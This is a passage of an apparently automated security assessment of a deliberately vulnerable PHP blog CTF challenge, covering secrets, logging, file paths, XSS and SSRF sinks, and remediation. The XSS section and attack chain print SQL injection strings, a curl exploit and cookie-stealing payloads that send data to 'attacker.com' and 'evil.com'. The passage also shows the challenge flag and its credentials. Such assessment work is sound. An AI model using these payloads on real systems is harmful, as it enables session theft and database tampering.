5. **Command Injection (Not Applicable)**: No shell commands executed with user input, but framework is absent if features are added

**Best Practice Comparison:**

Modern PHP applications should implement defense-in-depth input validation:

```php
// What SHOULD be done (not implemented):
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
if (!$username || strlen($username) > 255) {
    die("Invalid username");
}
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $username)) {
    die("Username contains invalid characters");
}
```

### Background Processing

**Not Implemented**: The application has no asynchronous job processing, message queues, or background workers. All processing occurs synchronously within the HTTP request-response cycle. There is no evidence of:

- Cron jobs or scheduled tasks
- Message queue systems (RabbitMQ, Redis, Kafka)
- Background job frameworks (Gearman, Beanstalkd)
- Celery, Resque, or Sidekiq equivalents for PHP

**Future Risk**: If background processing is added without security consideration, the current lack of input validation would allow command injection or other vulnerabilities in job parameters. Job queues often deserialize data, creating potential PHP object injection vulnerabilities.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Critical Finding: Hardcoded Credentials in Source Control**

The application commits sensitive credentials directly to the Git repository across multiple files:

**1. Database Credentials in Application Code:**

- **File**: `/app/html/index.php` (line 2), `/app/html/admin.php` (line 12)
- **Credentials**: Username `user`, password `password`, host `db`, database `blogDB`
- **Issue**: Hardcoded in PHP source files, visible to anyone with repository access
- **Impact**: Complete database access for anyone who can read the source code

**2. Database Credentials in Infrastructure Configuration:**

- **File**: `/docker-compose.yml` (lines 14, 26-29)
- **Credentials**: User password `password`, root password `rootpassword`
- **Issue**: Stored in plaintext YAML file, committed to version control
- **Impact**: Full database administrative access, ability to create backdoor accounts

**3. Admin Credentials in Database Initialization:**

- **File**: `/app/db_init.sql` (line 57)
- **Credentials**: Plaintext password `ONEverySecurePassword123!` visible in SQL file
- **Issue**: Password exposed before hashing occurs
- **Impact**: Admin application access for anyone with source code access

**4. CTF Flag in Environment and Source:**

- **File**: `.env` (if present), injected into `/app/html/admin.php` at build time
- **Issue**: Flag becomes permanent part of container image layers
- **Impact**: Flag extractable via `docker history` command or image filesystem inspection

**Proper Secrets Management (Not Implemented):**

The application should use:
- Docker Secrets for sensitive values in Compose files
- Environment variables read at runtime (not hardcoded)
- Secrets management services (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)
- Encrypted configuration files with keys stored separately
- Secret rotation policies and automation

### Configuration Security

**Environment Separation:**

The application demonstrates **no environment separation**. There is no concept of development, staging, or production environments with different configurations. All configuration is hardcoded, meaning:

- Development credentials are the same as "production" credentials
- Debug settings (`display_errors = On`) are enabled in all environments
- No environment-specific configuration files (no `config.dev.php`, `config.prod.php`)

**Secret Handling:**

The `docker-compose.yml` defines environment variables (lines 12-15) but the PHP application **ignores them completely**, using hardcoded values instead. This represents a failed attempt at environment-based configuration:

```yaml
# Defined but unused:
environment:
  MYSQL_HOST: db
  MYSQL_USER: user
  MYSQL_PASSWORD: password
  MYSQL_DATABASE: blogDB
```

```php
// Application uses hardcoded values:
$conn = new mysqli('db', 'user', 'password', 'blogDB');
// Should use: getenv('MYSQL_HOST'), getenv('MYSQL_USER'), etc.
```

**Infrastructure Security Headers:**

A comprehensive search of Apache configuration (`000-default.conf`), Kubernetes manifests (none found), and Nginx configurations (none found) reveals **zero security headers configured**:

- ❌ `Strict-Transport-Security` (HSTS): Not set (no HTTPS enforcement)
- ❌ `Cache-Control` on sensitive pages: Not set (browsers may cache admin pages)
- ❌ `Content-Security-Policy`: Not set (no XSS defense)
- ❌ `X-Frame-Options`: Not set (clickjacking possible)
- ❌ `X-Content-Type-Options`: Not set (MIME sniffing possible)
- ❌ `Referrer-Policy`: Not set (may leak sensitive URLs)

The only security-adjacent header is implicitly set by Apache: `X-Powered-By: PHP/7.4.x`, which is a security vulnerability itself (information disclosure).

### External Dependencies

**Direct Dependencies:**

1. **PHP 7.4 (CRITICAL RISK)**: End-of-life as of November 28, 2022. No security updates available. Known CVEs will remain unpatched. Official Docker image `php:7.4-apache` still exists but contains outdated packages.

2. **MySQL 5.7 (HIGH RISK)**: Entered extended support October 2023. Only critical security patches provided. MySQL 8.0 should be used for active security support.

3. **Apache 2.4**: Bundled in `php:7.4-apache` image. The exact version is unknown without inspecting the container, but it tracks the Debian base image version. Likely receives security updates through Debian repositories.

4. **Debian Base OS**: The `php:7.4-apache` image is Debian-based (likely Debian 10 Buster or 11 Bullseye). The base OS layer may have security updates, but the PHP runtime remains vulnerable.

**PHP Extensions:**

- `mysqli`: Bundled with PHP 7.4, shares PHP's EOL status
- `mod_rewrite`: Apache module, maintained with Apache

**System Packages:**

- `default-mysql-client`: Debian package for `mysql` CLI tool
- `netcat`: Used in healthchecks and initialization scripts
- `curl`: Used in healthcheck for HTTP testing

**Security Implications:**

- **No Dependency Vulnerability Scanning**: No evidence of tools like Snyk, Trivy, or Dependabot
- **No Software Bill of Materials (SBOM)**: No documentation of component versions
- **No Update Process**: Dockerfile uses `php:7.4-apache` without version pinning (should use `php:7.4.33-apache` to control updates)
- **Supply Chain Risk**: Base images pulled from Docker Hub without signature verification

**Third-Party Services:**

The application makes **zero external API calls or third-party service integrations**:
- ✅ No payment gateways (Stripe, PayPal)
- ✅ No analytics services (Google Analytics, Mixpanel)
- ✅ No CDN usage (Cloudflare, Akamai)
- ✅ No email services (SendGrid, Mailgun)
- ✅ No OAuth providers (Google, Facebook, GitHub)
- ✅ No logging services (Datadog, Splunk)

This minimal external dependency footprint reduces third-party supply chain risk but provides no external security services (WAF, DDoS protection, fraud detection).

### Monitoring & Logging

**Security Event Visibility:**

The application implements **minimal logging with critical security gaps**:

**Apache Access Logs:**
- **File**: `/var/log/apache2/access2.log` (line 16 of `000-default.conf`)
- **Format**: Combined log format (IP, timestamp, request, status, size, referrer, user-agent)
- **Security Value**: Provides basic request auditing but no authentication event logging
- **Missing**: No correlation IDs, no user context, no geolocation data

**Apache Error Logs:**
- **File**: `/var/log/apache2/error2.log` (line 15 of `000-default.conf`)
- **Content**: Apache module errors, PHP fatal errors, file not found errors
- **Security Risk**: May contain sensitive information (file paths, query strings)

**PHP Error Logs:**
- **File**: `/dev/stderr` (line 13 of `Dockerfile`)
- **Configuration**: `display_errors = On`, `error_reporting = E_ALL`
- **Security Risk**: CRITICAL - Errors displayed to users, exposing database structure, file paths, and logic

**Database Logs:**
- **Status**: Not explicitly configured
- **Default Behavior**: MySQL 5.7 logs to stderr (container logs), general query log disabled by default

**Critical Missing Security Logging:**

1. **Authentication Events**: No logging of login attempts (success or failure), no tracking of authentication sources, no brute force detection
2. **Authorization Failures**: No logging of attempts to access admin area without authentication
3. **SQL Injection Attempts**: No WAF or IDS to detect and log SQL injection patterns
4. **Anomalous Behavior**: No monitoring for unusual query patterns, excessive error rates, or suspicious IP addresses
5. **Data Access Auditing**: No tracking of who accessed what data and when
6. **Session Events**: No logging of session creation, destruction, or hijacking attempts

**Log Retention and Analysis:**

- **Retention**: Logs stored in ephemeral container storage, lost on container restart
- **Rotation**: No logrotate configuration; logs will grow unbounded
- **Centralization**: No log shipping to central systems (ELK, Splunk, CloudWatch)
- **Alerting**: No real-time alerting on security events
- **SIEM Integration**: None

**Monitoring Gaps:**

- ❌ No application performance monitoring (APM)
- ❌ No uptime monitoring beyond Docker healthchecks
- ❌ No resource usage monitoring (CPU, memory, disk)
- ❌ No security monitoring (IDS/IPS)
- ❌ No database performance monitoring
- ❌ No alerting infrastructure

---

## 7. Overall Codebase Indexing

The XBEN-039-24 codebase follows a **flat, minimalist structure** typical of small educational CTF challenges, with no framework scaffolding or multi-layer architecture. The entire application consists of only 7 files across 2 directories, totaling approximately 350 lines of code including comments and whitespace. This extreme simplicity is both a security risk (no framework-provided protections) and a clarity advantage (entire attack surface is immediately visible).

**Directory Structure Analysis:**

The root directory contains Docker orchestration files (`docker-compose.yml`, `.env`, `Makefile`, `benchmark.json`) that define infrastructure but are not deployed as part of the runtime application. The build process references `../common.mk`, suggesting this challenge is part of a larger CTF framework with shared build tooling, though only the final containerized application is relevant for penetration testing. The presence of `.xben_build_done` indicates a build marker file used by the CTF infrastructure.

The `app/` subdirectory is the application root, containing both build-time artifacts (`Dockerfile`, `000-default.conf`, `entrypoint.sh`, `db_init.sql`) and runtime code in `app/html/`. This mixing of concerns is typical of simple containerized apps but violates separation of build and runtime contexts in production systems. The `Dockerfile` uses a multi-step build pattern that injects the CTF flag at build time via `sed` (line 21), baking the flag into the container image permanently rather than providing it at runtime.

**Code Organization Conventions:**

The application uses **no code generation tools**, no templating engines (raw PHP with inline HTML), and no modern build systems (no Composer for dependencies, no Webpack for assets, no task runners). Database interactions are handled through raw `mysqli` calls without any ORM (Object-Relational Mapping) or query builder abstraction. The database schema is version-controlled as a single SQL file (`db_init.sql`) that drops and recreates tables on every container startup, making this unsuitable for stateful deployments but appropriate for ephemeral CTF instances.

**Testing and Quality Assurance:**

The complete absence of a `tests/` directory, no PHPUnit configuration, no test files, and no CI/CD testing pipeline indicates **zero automated testing**. There are no unit tests for authentication logic, no integration tests for SQL query safety, and no security tests for input validation. The only "testing" mechanism is the Docker healthcheck, which merely verifies HTTP connectivity (`curl -f http://127.0.0.1:80/`) without validating application logic or security controls.

**Security-Relevant Organizational Patterns:**

The flat structure makes **discovery of security components trivial** but also means there is no security layer, no middleware directory, no authentication service, and no centralized input validation. All security decisions are made at the point of use (ad-hoc in each PHP file), leading to inconsistent security posture. The `000-default.conf` Apache configuration is copied during Docker build (line 16 of Dockerfile) but never references any `.htaccess` files, meaning there is no directory-level security configuration. The enabled `Options Indexes` directive combined with the lack of `.htaccess` files means any directory without an index file will display a directory listing.

**Impact on Security Assessment:**

This minimalist structure benefits penetration testers by reducing the attack surface investigation time—there are only 2 PHP files to audit for vulnerabilities (`index.php` and `admin.php`), 1 database schema file to review for data security issues, and 3 configuration files to check for misconfigurations. However, the lack of framework structure means there are no framework-level security controls to evaluate, no middleware pipeline to trace, and no security conventions to verify compliance with. Every security control must be manually implemented by the developer (which they have not done), making this a worst-case scenario for security posture.

---

## 8. Critical File Paths

All file paths referenced in this analysis, categorized by their security relevance for manual review:

### Configuration Files
- `/docker-compose.yml` - Infrastructure definition, hardcoded credentials (lines 14, 26-29), port exposure (line 8), root password (line 26)
- `/app/000-default.conf` - Apache VirtualHost configuration, directory indexing enabled (line 10), no security headers, HTTP only (line 1)
- `/app/Dockerfile` - Container build instructions, PHP error display enabled (lines 9-13), FLAG injection via sed (line 21), ARG FLAG (line 20)
- `/.env` - Environment variables file, contains FLAG value
- `/Makefile` - Build automation, references external common.mk

### Authentication & Authorization
- `/app/html/admin.php` - **CRITICAL**: Admin login page with SQL injection (line 20), MD5 hashing (line 18), session management (lines 2, 5, 25), flag display (lines 6, 26), connection error disclosure (line 14)
- `/app/html/index.php` - Blog listing page with commented SQL injection (line 46), query error disclosure (line 53), hardcoded credentials (line 2)

### API & Routing
- `/app/html/admin.php` - POST endpoint for authentication, GET endpoint for login form
- `/app/html/index.php` - GET endpoint for blog listing, disabled category filtering (line 38)
- No API schema files found (no OpenAPI/Swagger, no GraphQL schemas)

### Data Models & Database Interaction
- `/app/db_init.sql` - **CRITICAL**: Database schema definition (lines 7-31), plaintext admin password (line 57), CTF flag storage (line 54), table definitions for posts/comments/admins
- `/app/html/index.php` - Database queries (lines 26, 40-48), vulnerable SQL concatenation (line 46)
- `/app/html/admin.php` - Authentication query with SQL injection (line 20), connection handling (lines 12-15)

### Dependency Manifests
- No dependency manifests found (no `composer.json`, no `package.json`, no `requirements.txt`)
- Dependencies managed through Docker base image only

### Sensitive Data & Secrets Handling
- `/docker-compose.yml` - Database credentials in environment variables (lines 12-15, 26-29), root password (line 26)
- `/app/html/index.php` - Hardcoded database credentials (line 2)
- `/app/html/admin.php` - Hardcoded database credentials (line 12)
- `/app/db_init.sql` - Plaintext admin password (line 57)
- `/app/Dockerfile` - FLAG injection mechanism (lines 20-21)
- `/.env` - FLAG storage

### Middleware & Input Validation
- No middleware layer exists
- No input validation found in any files
- `/app/html/admin.php` - Direct use of `$_POST` without validation (lines 17-18)
- `/app/html/index.php` - Disabled `$_GET` parameter usage (line 38)

### Logging & Monitoring
- `/app/000-default.conf` - Apache log configuration, ErrorLog (line 15), CustomLog (line 16)
- `/app/Dockerfile` - PHP error logging to stderr (line 13), display_errors enabled (lines 9-11)
- No application-level logging implemented

### Infrastructure & Deployment
- `/docker-compose.yml` - Service definitions (web, db), networking, healthchecks (lines 16-20, 32-36)
- `/app/Dockerfile` - Build steps, package installation, FLAG injection, Apache configuration copy
- `/app/entrypoint.sh` - Container startup script, MySQL initialization with credentials (line 10), health check waiting
- `/app/000-default.conf` - Apache VirtualHost, DocumentRoot `/var/www/html`, port 80 binding

### CTF Flag Storage
- `/app/html/admin.php` - Flag output after authentication (lines 6, 26), `@FLAG@` placeholder replaced at build time
- `/app/db_init.sql` - Flag in database post table (line 54), `<FLAG>@FLAG@</FLAG>` in content field
- `/.env` - FLAG environment variable: `flag{c969819d-7a14-4c90-b85d-51eccd232580}`
- `/app/Dockerfile` - FLAG injection via sed command (line 21), ARG FLAG (line 20)

### Static Assets & Styling
- `/app/html/styles.css` - CSS styling, no security relevance
- `/app/html/images/morning-dew.jpg` - Static image (WebP format)
- `/app/html/images/sunset.jpg` - Static image (WebP format)

### Testing & Build Artifacts
- `/benchmark.json` - CTF challenge metadata, not deployed
- `/.xben_build_done` - Build completion marker
- `/Makefile` - Build automation, references `../common.mk`

---

## 9. XSS Sinks and Render Contexts

**Scope Clarification**: This analysis covers only XSS sinks in network-accessible web pages (`/index.php` and `/admin.php`). All identified sinks are **stored XSS vulnerabilities** requiring database poisoning via SQL injection before exploitation. No reflected XSS or DOM-based XSS sinks were identified.

### XSS Sink Inventory

**SINK #1: Post Title - HTML Body Context**

- **File**: `/app/html/index.php`
- **Line**: 59
- **Code**: `echo "<h2>{$row['title']}</h2>"`
- **Render Context**: HTML element content within `<h2>` tags
- **User Input Source**: `$row['title']` from `posts.title` database column (TEXT field)
- **Exploitability**: Requires SQL injection in `/admin.php` to poison database
- **Attack Chain**:
  1. Exploit SQL injection: `username=admin'; INSERT INTO posts (title, category, content, published) VALUES ('<script>alert(document.domain)</script>', 'Test', 'Content', 1); --`
  2. Victim visits `/index.php`
  3. Malicious script executes in victim's browser
- **Sample Payload**: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`
- **Mitigation**: `echo "<h2>" . htmlspecialchars($row['title'], ENT_QUOTES, 'UTF-8') . "</h2>";`

**SINK #2: Post Category - HTML Body Context**

- **File**: `/app/html/index.php`
- **Line**: 60
- **Code**: `<p>Category: {$row['category']}</p>`
- **Render Context**: HTML element content within `<p>` tags
- **User Input Source**: `$row['category']` from `posts.category` database column (VARCHAR(255))
- **Exploitability**: Requires SQL injection to poison database
- **Sample Payload**: `<img src=x onerror=alert(document.domain)>`
- **Mitigation**: `echo "<p>Category: " . htmlspecialchars($row['category'], ENT_QUOTES, 'UTF-8') . "</p>";`

**SINK #3: Post Content - HTML Body Context**

- **File**: `/app/html/index.php`
- **Line**: 62
- **Code**: `<p>" . substr($row['content'], 0, 200) . "...</p>`
- **Render Context**: HTML element content within `<p>` tags, truncated to 200 characters
- **User Input Source**: `$row['content']` from `posts.content` database column (TEXT field)
- **Exploitability**: Requires SQL injection to poison database
- **Payload Constraint**: Must execute within 200 characters
- **Sample Payload**: `<svg onload=fetch('http://evil.com/xss?c='+document.cookie)>` (69 characters)
- **Mitigation**: `echo "<p>" . htmlspecialchars(substr($row['content'], 0, 200), ENT_QUOTES, 'UTF-8') . "...</p>";`

**SINK #4: Image Source Attribute - HTML Attribute Context**

- **File**: `/app/html/index.php`
- **Line**: 61
- **Code**: `<img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>`
- **Render Context**: `src` attribute of `<img>` element (single-quoted)
- **User Input Source**: `$row['image']` from `posts.image` database column (VARCHAR(255))
- **Exploitability**: Requires SQL injection to poison database
- **Attack Vector**: Break out of `src` attribute to inject event handlers
- **Sample Payload**: `x' onerror='alert(document.domain)` (results in `<img src='images/x' onerror='alert(document.domain)'`)
- **Alternative**: `x'><script>alert(1)</script><img src='x` (injects new script tag)
- **Mitigation**: `$safeImage = htmlspecialchars($row['image'], ENT_QUOTES, 'UTF-8'); echo "<img src='images/{$safeImage}' ...";`

**SINK #5: Image Alt Attribute - HTML Attribute Context**

- **File**: `/app/html/index.php`
- **Line**: 61
- **Code**: `<img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>`
- **Render Context**: `alt` attribute of `<img>` element (single-quoted)
- **User Input Source**: `$row['title']` from `posts.title` database column (TEXT field)
- **Exploitability**: Requires SQL injection to poison database
- **Attack Vector**: Break out of `alt` attribute
- **Sample Payload**: `x' onload='alert(1)` (results in `<img ... alt='x' onload='alert(1)'`)
- **Note**: `onload` typically doesn't fire on `img` elements, but other injection vectors exist
- **Mitigation**: `$safeTitle = htmlspecialchars($row['title'], ENT_QUOTES, 'UTF-8'); echo "... alt='{$safeTitle}' ...";`

**SINK #6: Category Dropdown Options - HTML Attribute & Body Context**

- **File**: `/app/html/index.php`
- **Line**: 29
- **Code**: `echo "<option value='{$row['category']}' {$selected}>{$row['category']}</option>";`
- **Render Context**: Both `value` attribute and text content of `<option>` element (single-quoted)
- **User Input Source**: `$row['category']` from `SELECT DISTINCT category FROM posts` query
- **Exploitability**: Requires SQL injection to poison database with malicious category value
- **Attack Vector**: Break out of `value` attribute or inject HTML in option text
- **Sample Payload**: `x' onmouseover='alert(1)` (results in `<option value='x' onmouseover='alert(1)'>x' onmouseover='alert(1)</option>`)
- **Alternative**: `</option><option value='x' selected onmouseover='alert(1)'>Hover me` (injects new option with event handler)
- **Mitigation**: `$safeCategory = htmlspecialchars($row['category'], ENT_QUOTES, 'UTF-8'); echo "<option value='{$safeCategory}'>{$safeCategory}</option>";`

### XSS Sink Summary by Render Context

**HTML Body Context (Tags):**
- 3 sinks: post title (`<h2>`), post category (`<p>`), post content (`<p>`)
- **Dangerous Functions**: Direct variable interpolation in echo statements
- **Required Encoding**: `htmlspecialchars()` with `ENT_QUOTES` flag

**HTML Attribute Context:**
- 3 sinks: image src, image alt, option value
- **Attack Method**: Attribute breakout using quote characters
- **Required Encoding**: `htmlspecialchars()` with `ENT_QUOTES` flag (escapes both single and double quotes)

**JavaScript Context:**
- **Status**: None found
- No `<script>` tags with user-controlled content
- No inline event handlers with user-controlled attributes
- No `eval()`, `setTimeout()`, or `setInterval()` with user input

**CSS Context:**
- **Status**: None found (inline `style` attributes are hardcoded)

**URL Context:**
- **Status**: None found
- No `href`, `src`, or `action` attributes with user-controlled values (except image src which is prefixed with `images/`)

### Attack Chain for Stored XSS Exploitation

**Step 1: Database Poisoning via SQL Injection**
```bash
# Exploit admin login SQL injection to insert malicious post
curl -X POST http://target/admin.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'; INSERT INTO posts (title, category, content, image, published) VALUES ('<script>document.location=\"http://attacker.com/steal?c=\"+document.cookie</script>', 'Hacked', 'XSS content', 'x.jpg', 1); --&password=x"
```

**Step 2: Stored XSS Triggers**
```bash
# Any user visiting the blog page triggers the stored XSS
curl http://target/index.php
# Response includes: <h2><script>document.location="http://attacker.com/steal?c="+document.cookie</script></h2>
```

**Step 3: Session Hijacking**
- Victim's browser executes malicious script
- Script exfiltrates session cookie to attacker's server
- Attacker uses stolen `PHPSESSID` cookie to impersonate victim

### XSS Defense Mechanisms (All Missing)

1. **Output Encoding**: ❌ Not implemented - No `htmlspecialchars()`, `htmlentities()`, or HTML Purifier usage
2. **Content Security Policy (CSP)**: ❌ Not configured - No CSP headers in Apache config or PHP
3. **HTTPOnly Cookie Flag**: ❌ Not set - Session cookies accessible to JavaScript, enabling cookie theft
4. **Input Validation**: ❌ Not implemented - No restriction on HTML/script tags in database inputs
5. **HTML Sanitization**: ❌ Not implemented - No allowlist-based HTML filtering
6. **X-XSS-Protection Header**: ❌ Not set (though deprecated, still provides minimal browser protection)

---

## 10. SSRF Sinks

**Comprehensive Analysis Result: No SSRF Sinks Found**

After systematic analysis of all network-accessible components (`/index.php`, `/admin.php`) and supporting files, this application contains **zero server-side request forgery (SSRF) vulnerabilities**. The application does not implement any functionality that makes outbound HTTP requests, fetches external URLs, or processes user-controlled URLs.

### Search Methodology

The SSRF analysis examined the following sink categories:

**HTTP(S) Clients (PHP):**
- ❌ `curl_init()`, `curl_exec()`, `curl_multi_exec()` - Not found
- ❌ `file_get_contents()` with URLs - Not found (only database operations)
- ❌ `fopen()` with URLs - Not found
- ❌ `stream_context_create()` with HTTP wrappers - Not found
- ❌ Guzzle, Symfony HttpClient, or other HTTP libraries - Not installed

**Raw Sockets & Network Connections:**
- ❌ `fsockopen()`, `pfsockopen()` - Not found
- ❌ `socket_connect()`, `socket_create()` - Not found

**File Inclusion with URLs:**
- ❌ `include()`, `require()`, `include_once()`, `require_once()` with URLs - Not found (all includes would be local filesystem)
- ❌ `readfile()` with URLs - Not found

**XML/JSON External Entity Processing:**
- ❌ `simplexml_load_file()` with URLs - Not found
- ❌ `DOMDocument::load()` with URLs - Not found
- ❌ `json_decode()` with URL fetching - Not found

**Image Processing:**
- ❌ `getimagesize()` with URLs - Not found
- ❌ `imagecreatefromjpeg()`, `imagecreatefrompng()` with URLs - Not found
- ❌ ImageMagick, GD library with URL inputs - Not found

**Redirect Handlers:**
- ❌ `header("Location: " . $userInput)` - Not found
- No user-controlled redirects identified

**Mail/SMTP Functions:**
- ❌ `mail()`, `imap_open()` - Not found
- No email functionality in application

**Database Connections:**
- ✓ MySQL connection exists (`new mysqli('db', 'user', 'password', 'blogDB')`) but all parameters are **hardcoded**
- No user control over host, port, or connection parameters
- Not exploitable for SSRF

**Image Serving (Analyzed for SSRF):**
```php
// Line 61 in index.php:
<img src='images/{$row['image']}' ...>
```
- **Analysis**: Images served from static directory `images/`
- Path prefix is hardcoded: `images/` is prepended to database value
- No server-side fetching occurs—browser fetches from static path
- Not an SSRF vector (client-side request, not server-side)

### SSRF Attack Surface Assessment

**External Request Functionality: None**

The application's feature set is minimal and contains no functionality that would require server-side HTTP requests:

- ✅ **No webhook integrations** - No callback URLs, no webhook delivery systems
- ✅ **No external API calls** - No OAuth, no payment gateways, no third-party services
- ✅ **No URL fetchers** - No link preview generation, no metadata extraction
- ✅ **No feed readers** - No RSS/Atom parsing with external URLs
- ✅ **No proxy functionality** - No URL parameter that triggers server-side fetches
- ✅ **No file imports from URLs** - No "import from URL" features
- ✅ **No remote image processing** - Images are static files only
- ✅ **No SSO/OIDC discovery** - No JWKS fetching, no `.well-known` endpoint calls

### Future SSRF Risk

If the application were extended with new features, the following would create SSRF vulnerabilities given the current lack of input validation:

1. **Avatar Upload from URL**: If a feature were added allowing `POST /admin.php?avatar_url=https://example.com/image.jpg`, it would be immediately vulnerable without URL validation
2. **Webhook Notifications**: If admin actions triggered webhook calls to user-specified URLs
3. **Link Preview**: If comments were enabled and included automatic link unfurling
4. **Feed Aggregator**: If the blog added RSS feed import functionality
5. **Remote Backup**: If database backups could be uploaded to user-specified URLs

**Current Status**: None of these features exist; SSRF is not exploitable in the current implementation.

---

# Appendix: Comprehensive Security Assessment Summary

## Vulnerability Severity Matrix

| Vulnerability | CVSS Score | Severity | Exploitability | Impact | Location |
|--------------|-----------|----------|---------------|--------|----------|
| SQL Injection in Authentication | 10.0 | CRITICAL | Direct | Auth bypass, data exfiltration | `/app/html/admin.php:20` |
| MD5 Password Hashing | 9.8 | CRITICAL | Requires hash | Credential compromise | `/app/html/admin.php:18`, `/app/db_init.sql:57` |
| Hardcoded Database Credentials | 9.1 | CRITICAL | Requires code access | Full database access | Multiple files |
| No TLS/Encryption in Transit | 7.4 | CRITICAL | Network access | Data interception | All HTTP traffic |
| Stored XSS (6 sinks) | 7.1 | HIGH | Requires SQLi first | Session theft, defacement | `/app/html/index.php:29,59-62` |
| No Database Encryption at Rest | 6.5 | HIGH | Requires filesystem access | Data exposure | Database files |
| Verbose Error Messages | 5.3 | MEDIUM | Direct | Information disclosure | Multiple files |
| No Session Security | 6.5 | HIGH | Various methods | Session hijacking | `/app/html/admin.php:2` |
| Excessive DB Privileges | 7.1 | HIGH | Requires SQLi | Data destruction | Docker Compose config |

## Compliance Failure Summary

- **GDPR**: FAILED - No encryption, no data protection by design, no subject rights implementation
- **OWASP Top 10**: FAILED - Violations in A02 (Crypto), A03 (Injection), A05 (Misconfiguration), A07 (Auth)
- **PCI-DSS**: N/A - No payment data
- **SOC 2**: FAILED - All trust service criteria violated
- **ISO 27001**: FAILED - Multiple control deficiencies

## Penetration Testing Recommendations

**Phase 1: Authentication Testing**
1. Test SQL injection in `/admin.php` login form with payloads: `admin' OR '1'='1' --`, `admin'--`, `' OR '1'='1' --`
2. Attempt brute force attack (no rate limiting exists)
3. Test session fixation by setting PHPSESSID cookie before authentication
4. Test CSRF by creating malicious login form on attacker-controlled site

**Phase 2: Data Extraction**
1. Extract database schema via SQL injection UNION attacks
2. Retrieve CTF flag from database (unpublished post in Secret category)
3. Extract admin password hash and attempt MD5 cracking

**Phase 3: XSS Exploitation**
1. Poison database via SQL injection with XSS payloads in post title/content
2. Steal admin session cookies via stored XSS (no HTTPOnly flag)
3. Demonstrate account takeover

**Phase 4: Network Analysis**
1. Capture HTTP traffic to demonstrate plaintext credential transmission
2. Intercept database traffic between containers (if host access available)
3. Demonstrate lack of encryption at rest by accessing database files

## Remediation Priority

**P0 - Critical (Fix Immediately):**
1. Replace SQL concatenation with prepared statements (mysqli_prepare)
2. Replace MD5 with `password_hash()` using PASSWORD_ARGON2ID
3. Implement HTTPS/TLS with valid certificate
4. Remove hardcoded credentials, use environment variables or secrets manager
5. Disable `display_errors` in PHP configuration

**P1 - High (Fix Within 1 Week):**
1. Implement output encoding (`htmlspecialchars`) for all user-generated content
2. Configure secure session cookies (HttpOnly, Secure, SameSite)
3. Implement session regeneration after authentication
4. Enable database encryption at rest (InnoDB encryption)
5. Reduce database user privileges to minimum required

**P2 - Medium (Fix Within 1 Month):**
1. Add CSRF protection tokens
2. Implement rate limiting on authentication endpoint
3. Add security headers (CSP, X-Frame-Options, HSTS)
4. Disable directory indexing
5. Implement proper error handling with generic user-facing messages

**P3 - Low (Fix Within 3 Months):**
1. Add input validation framework
2. Implement centralized logging with security event tracking
3. Add RBAC instead of boolean authorization
4. Upgrade to PHP 8.x (supported version)
5. Upgrade to MySQL 8.0
6. Implement backup and disaster recovery procedures

---

**END OF SECURITY ANALYSIS REPORT**

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-31T04:04:17.223Z